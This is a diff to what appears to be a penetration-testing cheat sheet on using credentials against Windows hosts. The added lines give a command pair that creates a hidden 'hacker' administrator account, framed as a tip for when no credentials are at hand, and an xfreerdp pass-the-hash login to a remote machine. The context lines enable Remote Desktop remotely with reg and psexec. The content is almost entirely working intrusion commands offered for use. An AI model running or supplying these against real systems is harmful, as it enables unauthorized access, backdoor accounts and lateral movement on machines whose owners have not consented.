@@ -1,4 +1,10 @@
 # Windows - Using credentials
+Little tip, if you don't have credentials yet :D
+```
+net user hacker hacker /add
+net localgroup administrators hacker /add
+```
+
 
 ## Metasploit - SMB
 ```c
@@ -60,6 +66,11 @@ reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnec
 or with psexec(sysinternals)
 ```
 psexec \\machinename reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
+```
+
+For Server 2012 R2, Win8.1+
+```
+xfreerdp /u:offsec /d:win2012 /pth:88a405e17c0aa5debbc9b5679753939d /v:192.168.1.12
 ```
 
 ## Netuse (Windows)
